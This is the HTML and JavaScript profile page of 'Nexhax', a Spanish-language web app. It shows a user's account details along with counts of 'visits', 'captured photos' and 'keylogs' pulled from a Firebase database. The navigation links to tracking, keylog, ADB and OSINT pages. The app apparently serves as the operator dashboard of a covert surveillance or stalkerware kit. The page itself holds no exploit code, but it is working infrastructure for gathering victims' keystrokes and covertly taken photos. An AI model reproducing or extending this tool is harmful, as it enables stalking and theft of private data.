<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Perfil de usuario - Nexhax">
    <meta name="theme-color" content="#000000">
    <meta name="color-scheme" content="light dark">
    <title>Perfil - Nexhax</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>

<body>
    <header class="topbar">
        <div class="brand">Nexhax</div>
        <button class="btn btn-outline-secondary d-md-none" type="button" data-bs-toggle="offcanvas"
            data-bs-target="#mobileNav" aria-controls="mobileNav">
            Menu
        </button>
        <nav class="nav-links">
            <a href="home.html">Dashboard</a>
            <a href="rastreo.html">Rastreo</a>
            <a href="keylogs.html">Keylogs</a>
            <a href="perfil.html" class="active">Perfil</a>
            <a href="adb.html">ADB</a>
            <a href="osint.html">OSINT</a>
        </nav>
        <a href="home.html" class="btn-ghost btn-inline">Volver</a>
    </header>

    <div class="offcanvas offcanvas-start d-md-none" tabindex="-1" id="mobileNav" aria-labelledby="mobileNavLabel">
        <div class="offcanvas-header">
            <h5 class="offcanvas-title" id="mobileNavLabel">Navegacion</h5>
            <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Cerrar"></button>
        </div>
        <div class="offcanvas-body">
            <div class="list-group">
                <a href="home.html" class="list-group-item list-group-item-action">Dashboard</a>
                <a href="rastreo.html" class="list-group-item list-group-item-action">Rastreo</a>
                <a href="keylogs.html" class="list-group-item list-group-item-action">Keylogs</a>
                <a href="perfil.html" class="list-group-item list-group-item-action active">Perfil</a>
                <a href="adb.html" class="list-group-item list-group-item-action">ADB</a>
                <a href="osint.html" class="list-group-item list-group-item-action">OSINT</a>
            </div>
        </div>
    </div>

    <div class="card">
        <h2>Perfil de Usuario</h2>
        <div id="profile-status" style="color: var(--text-gray); margin-bottom: 12px;">
            <span class="loading"></span> Cargando...
        </div>

        <div class="info-grid stagger">
            <div class="info-item">
                <div class="info-label">Email</div>
                <div class="info-value" id="profile-email">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">UID</div>
                <div class="info-value" id="profile-uid">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">Proveedor</div>
                <div class="info-value" id="profile-provider">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">Creado</div>
                <div class="info-value" id="profile-created">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">Ultimo acceso</div>
                <div class="info-value" id="profile-last">-</div>
            </div>
            <div class="info-item">
                <div class="info-label">Dispositivo</div>
                <div class="info-value" id="profile-device">-</div>
            </div>
        </div>

        <h3>Actividad</h3>
        <div class="stats-grid stagger">
            <div class="stat-card">
                <div class="stat-number" id="profile-total-visits">0</div>
                <div class="stat-label">Total Visitas</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="profile-today-visits">0</div>
                <div class="stat-label">Visitas Hoy</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="profile-total-photos">0</div>
                <div class="stat-label">Fotos Capturadas</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="profile-total-keylogs">0</div>
                <div class="stat-label">Keylogs</div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script type="module">
        import { auth, db, ref, onValue, set, onDisconnect, signOut } from './firebase-config.js';
        import { ensureSingleSession } from './session-guard.js';

        const statusEl = document.getElementById('profile-status');
        const emailEl = document.getElementById('profile-email');
        const uidEl = document.getElementById('profile-uid');
        const providerEl = document.getElementById('profile-provider');
        const createdEl = document.getElementById('profile-created');
        const lastEl = document.getElementById('profile-last');
        const deviceEl = document.getElementById('profile-device');

        const totalVisitsEl = document.getElementById('profile-total-visits');
        const todayVisitsEl = document.getElementById('profile-today-visits');
        const totalPhotosEl = document.getElementById('profile-total-photos');
        const totalKeylogsEl = document.getElementById('profile-total-keylogs');

        auth.onAuthStateChanged(u => {
            if (!u) {
                location.href = 'index.html';
                return;
            }

            ensureSingleSession({ auth, db, ref, set, onValue, onDisconnect, signOut, user: u });

            statusEl.textContent = 'Usuario autenticado';
            emailEl.textContent = u.email || 'Sin email';
            uidEl.textContent = u.uid || '-';

            const providerId = (u.providerData && u.providerData[0] && u.providerData[0].providerId) || '';
            providerEl.textContent = providerId === 'password' ? 'Email/Password' : (providerId || 'Desconocido');

            const createdAt = u.metadata && u.metadata.creationTime ? new Date(u.metadata.creationTime) : null;
            const lastLogin = u.metadata && u.metadata.lastSignInTime ? new Date(u.metadata.lastSignInTime) : null;
            createdEl.textContent = createdAt ? createdAt.toLocaleString('es-ES') : '-';
            lastEl.textContent = lastLogin ? lastLogin.toLocaleString('es-ES') : '-';

            deviceEl.textContent = `${navigator.platform || 'N/A'} | ${navigator.language || 'N/A'}`;

            const visitasRef = ref(db, `visitas/${u.uid}`);
            onValue(visitasRef, (snap) => {
                let totalVisits = 0;
                let totalPhotos = 0;
                let todayVisits = 0;
                const now = new Date();
                const startToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();

                if (snap.exists()) {
                    snap.forEach(child => {
                        const visit = child.val();
                        totalVisits++;
                        if (visit && visit.foto) totalPhotos++;
                        if (visit && visit.timestamp && visit.timestamp >= startToday) {
                            todayVisits++;
                        }
                    });
                }

                totalVisitsEl.textContent = totalVisits;
                totalPhotosEl.textContent = totalPhotos;
                todayVisitsEl.textContent = todayVisits;
            });

            const keylogsRef = ref(db, `keylogs/${u.uid}`);
            onValue(keylogsRef, (snap) => {
                let totalKeylogs = 0;
                if (snap.exists()) {
                    snap.forEach(() => totalKeylogs++);
                }
                totalKeylogsEl.textContent = totalKeylogs;
            });
        });
    </script>
</body>

</html>
